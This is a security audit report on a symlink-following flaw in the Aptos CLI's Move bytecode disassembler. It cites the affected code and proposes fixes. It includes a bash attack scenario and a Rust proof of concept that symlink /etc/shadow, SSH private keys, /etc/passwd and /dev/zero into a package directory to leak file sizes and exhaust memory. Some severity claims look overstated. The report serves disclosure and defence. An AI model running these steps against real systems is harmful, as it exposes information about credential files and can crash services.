# Audit Report

## Title
Path Traversal via Symlink Following in Move Bytecode Disassembler Leading to Denial of Service and Information Disclosure

## Summary
The `execute()` function in the Move bytecode disassembler fails to validate or sanitize symbolic links when processing user-provided package directories. This allows an attacker to create malicious symlinks pointing to sensitive files or special device files, leading to information disclosure (file size leakage) and denial of service through memory exhaustion or indefinite hangs.

## Finding Description

The vulnerability exists in the bytecode processing pipeline when the `--package-path` option is provided: [1](#0-0) 

The `read_dir_files()` function implementation contains no symlink validation: [2](#0-1) 

This function uses `std::fs::read_dir()` which returns directory entries as-is, including symbolic links. The returned paths are then used directly without canonicalization or symlink checking.

Subsequently, these paths are passed to file reading operations that automatically follow symlinks: [3](#0-2) 

The attack manifests in multiple ways:

**1. Information Disclosure via File Size Leakage:**
When the `--print-code-size` flag is used, the tool prints the byte size of files: [4](#0-3) 

An attacker can determine the size of arbitrary files on the system by creating symlinks and using this flag.

**2. Denial of Service via Special Files:**
When `std::fs::read()` is called on a symlink pointing to special files like `/dev/zero`, `/dev/random`, or named pipes, it attempts to read the entire "file" into memory: [5](#0-4) 

- Symlink to `/dev/zero` → causes unbounded memory allocation until OOM
- Symlink to named pipe → causes indefinite hang until pipe has data
- Symlink to large files → causes excessive memory consumption

**3. Multiple File Access Points:**
The vulnerability is compounded as the tool also reads associated source files: [6](#0-5) 

An attacker can create multiple symlinks (`.mv`, `.move`, `.mvsm`) to access different sensitive files.

**Attack Scenario:**
```bash
# Attacker creates malicious directory
mkdir /tmp/malicious
cd /tmp/malicious
ln -s /etc/shadow secrets.mv
ln -s /root/.ssh/id_rsa keys.mv
ln -s /dev/zero dos.mv

# Victim runs disassemble command
aptos move disassemble --package-path /tmp/malicious --print-code-size

# Result: File sizes disclosed, potential DoS if dos.mv is processed
```

## Impact Explanation

This vulnerability qualifies as **High Severity** under Aptos bug bounty criteria for the following reasons:

**Validator Node Slowdowns/DoS:** If a validator operator or node administrator runs this tool on an untrusted directory (for debugging or analysis purposes), symlinks to special files like `/dev/zero` will cause:
- Memory exhaustion leading to OOM kills
- Process hangs causing operational disruption
- System instability affecting validator node availability

**Information Disclosure:** The `--print-code-size` flag allows unauthorized disclosure of file sizes for any file readable by the process, including:
- Configuration files revealing system architecture
- Key files indicating cryptographic material presence
- Database files revealing storage patterns

**Automated Systems Risk:** If this tool is integrated into:
- CI/CD pipelines processing user-submitted packages
- Automated security analysis systems
- Package registries with automatic bytecode analysis

An attacker can cause persistent DoS by uploading packages containing malicious symlinks.

## Likelihood Explanation

**Likelihood: Medium to High**

The vulnerability is exploitable when:
1. **Developer/Operator Scenario**: A user runs the disassemble command on an untrusted directory obtained from external sources (downloaded packages, shared filesystems, mounted volumes)
2. **Automated Systems**: Integration into CI/CD or analysis pipelines that process user-uploaded content
3. **Social Engineering**: Convincing a target to analyze a "suspicious" package containing malicious bytecode

The attack requires no special privileges and can be triggered by any user who can create symbolic links and convince a target to process that directory. The lack of any warning or validation makes this attack trivial to execute.

## Recommendation

Implement symlink detection and validation in `read_dir_files()`:

```rust
pub fn read_dir_files(
    path: &Path,
    predicate: impl Fn(&Path) -> bool,
) -> CliTypedResult<Vec<PathBuf>> {
    let to_cli_err = |err| CliError::IO(path.display().to_string(), err);
    
    // Canonicalize the base directory to prevent traversal
    let canonical_base = path.canonicalize().map_err(to_cli_err)?;
    
    let mut result = vec![];
    for entry in std::fs::read_dir(path).map_err(to_cli_err)? {
        let entry = entry.map_err(to_cli_err)?;
        let entry_path = entry.path();
        
        // Check if entry is a symlink
        let metadata = std::fs::symlink_metadata(&entry_path).map_err(to_cli_err)?;
        if metadata.is_symlink() {
            return Err(CliError::UnexpectedError(format!(
                "Symbolic link detected: {}. For security reasons, symbolic links are not allowed.",
                entry_path.display()
            )));
        }
        
        // Verify the path is still within the base directory
        let canonical_entry = entry_path.canonicalize().map_err(to_cli_err)?;
        if !canonical_entry.starts_with(&canonical_base) {
            return Err(CliError::UnexpectedError(format!(
                "Path traversal detected: {} is outside the package directory",
                entry_path.display()
            )));
        }
        
        if predicate(canonical_entry.as_path()) {
            result.push(canonical_entry)
        }
    }
    Ok(result)
}
```

Additionally, add file size validation before reading:
```rust
pub fn read_from_file(path: &Path) -> CliTypedResult<Vec<u8>> {
    // Check metadata before reading
    let metadata = std::fs::metadata(path)
        .map_err(|e| CliError::UnableToReadFile(format!("{}", path.display()), e.to_string()))?;
    
    // Reject if symlink (though should be caught earlier)
    if metadata.is_symlink() {
        return Err(CliError::UnexpectedError(
            "Attempted to read symbolic link".to_string()
        ));
    }
    
    // Impose reasonable size limit (e.g., 10MB for bytecode files)
    const MAX_FILE_SIZE: u64 = 10 * 1024 * 1024;
    if metadata.len() > MAX_FILE_SIZE {
        return Err(CliError::UnexpectedError(format!(
            "File too large: {} bytes (max: {} bytes)",
            metadata.len(), MAX_FILE_SIZE
        )));
    }
    
    std::fs::read(path)
        .map_err(|e| CliError::UnableToReadFile(format!("{}", path.display()), e.to_string()))
}
```

## Proof of Concept

```rust
// Save as: test_symlink_vulnerability.rs
// Run with: rustc test_symlink_vulnerability.rs && ./test_symlink_vulnerability

use std::fs;
use std::os::unix::fs::symlink;
use std::path::PathBuf;
use std::process::Command;

fn main() {
    println!("[*] Symlink Attack PoC for Aptos Move Bytecode Disassembler");
    
    // Create temporary malicious directory
    let malicious_dir = "/tmp/aptos_symlink_poc";
    fs::create_dir_all(malicious_dir).expect("Failed to create directory");
    
    // Create symlinks to sensitive files
    let symlink_targets = vec![
        ("etc_passwd.mv", "/etc/passwd"),
        ("dev_zero.mv", "/dev/zero"),  // DoS vector
    ];
    
    for (name, target) in symlink_targets {
        let link_path = PathBuf::from(malicious_dir).join(name);
        // Remove if exists
        let _ = fs::remove_file(&link_path);
        // Create symlink
        symlink(target, &link_path).expect(&format!("Failed to create symlink to {}", target));
        println!("[+] Created symlink: {} -> {}", link_path.display(), target);
    }
    
    println!("\n[*] Running vulnerable command:");
    println!("    aptos move disassemble --package-path {} --print-code-size\n", malicious_dir);
    
    // Execute the vulnerable command
    let output = Command::new("aptos")
        .args(&[
            "move", "disassemble",
            "--package-path", malicious_dir,
            "--print-code-size"
        ])
        .output();
    
    match output {
        Ok(out) => {
            println!("[!] Command output:");
            println!("{}", String::from_utf8_lossy(&out.stdout));
            println!("{}", String::from_utf8_lossy(&out.stderr));
            
            if out.stdout.contains("kbs") {
                println!("\n[!] VULNERABILITY CONFIRMED: File size information disclosed!");
            }
        }
        Err(e) => {
            println!("[!] Command execution failed (might not have aptos CLI installed): {}", e);
            println!("[*] To test manually, run:");
            println!("    aptos move disassemble --package-path {} --print-code-size", malicious_dir);
        }
    }
    
    // Cleanup
    println!("\n[*] Cleaning up...");
    fs::remove_dir_all(malicious_dir).expect("Failed to cleanup");
    println!("[*] PoC complete");
}
```

**Expected Result:** The tool will follow the symlinks, read sensitive files, and disclose their sizes via the `--print-code-size` output. The `dev_zero.mv` symlink will cause memory exhaustion if processed.

## Notes

This vulnerability affects the Aptos CLI tool used by developers and operators. While not directly part of the consensus or execution layer, it poses a security risk in the following contexts:

1. **Validator Operations**: Operators debugging bytecode on production systems
2. **CI/CD Integration**: Automated analysis of user-submitted packages
3. **Development Workflows**: Developers analyzing untrusted code samples

The absence of symlink validation violates security best practices for processing user-controlled file paths and could lead to privilege escalation if the tool is run with elevated permissions or in automated systems with access to sensitive resources.

### Citations

**File:** crates/aptos/src/move_tool/bytecode.rs (L198-208)
```rust
        let inputs = if let Some(path) = self.input.bytecode_path.clone() {
            vec![path]
        } else if let Some(path) = self.input.package_path.clone() {
            read_dir_files(path.as_path(), |p| {
                p.extension()
                    .map(|s| s == MOVE_COMPILED_EXTENSION)
                    .unwrap_or_default()
            })?
        } else {
            unreachable!("arguments required by clap")
        };
```

**File:** crates/aptos/src/move_tool/bytecode.rs (L361-361)
```rust
        let bytecode_bytes = read_from_file(bytecode_path)?;
```

**File:** crates/aptos/src/move_tool/bytecode.rs (L362-371)
```rust
        if print_code_size {
            println!(
                "Code size of module {} is: {} kbs",
                bytecode_path
                    .file_name()
                    .unwrap_or_default()
                    .to_string_lossy(),
                bytecode_bytes.len() / 1024
            );
        }
```

**File:** crates/aptos/src/move_tool/bytecode.rs (L373-389)
```rust
        let source = {
            let move_path = bytecode_path.with_extension(MOVE_EXTENSION);
            if let Ok(source) = fs::read_to_string(move_path.clone()) {
                Some(source)
            } else {
                let move_path = move_path
                    .components()
                    .map(|elt| {
                        if elt.as_os_str() == "bytecode_modules" {
                            Component::Normal("sources".as_ref())
                        } else {
                            elt
                        }
                    })
                    .collect::<PathBuf>();
                fs::read_to_string(move_path).ok()
            }
```

**File:** crates/aptos/src/common/utils.rs (L213-216)
```rust
pub fn read_from_file(path: &Path) -> CliTypedResult<Vec<u8>> {
    std::fs::read(path)
        .map_err(|e| CliError::UnableToReadFile(format!("{}", path.display()), e.to_string()))
}
```

**File:** crates/aptos/src/common/utils.rs (L438-451)
```rust
pub fn read_dir_files(
    path: &Path,
    predicate: impl Fn(&Path) -> bool,
) -> CliTypedResult<Vec<PathBuf>> {
    let to_cli_err = |err| CliError::IO(path.display().to_string(), err);
    let mut result = vec![];
    for entry in std::fs::read_dir(path).map_err(to_cli_err)? {
        let path = entry.map_err(to_cli_err)?.path();
        if predicate(path.as_path()) {
            result.push(path)
        }
    }
    Ok(result)
}
```
